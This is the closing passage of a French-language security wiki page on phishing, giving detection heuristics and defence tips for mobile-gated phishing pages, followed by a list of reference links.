- Télémétrie web: séquence de `GET /static/detect_device.js` → `POST /detect` → HTTP 500 pour non‑mobile ; les chemins légitimes des victimes mobiles renvoient 200 avec HTML/JS de suivi.
- Bloquer ou examiner attentivement les pages qui conditionnent le contenu exclusivement sur `ontouchstart` ou des vérifications d'appareil similaires.

Conseils de défense :
- Exécuter des crawlers avec des fingerprints de type mobile et JS activé pour révéler le contenu restreint.
- Alerter sur les réponses 500 suspectes suivant `POST /detect` sur des domaines nouvellement enregistrés.

## Références

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
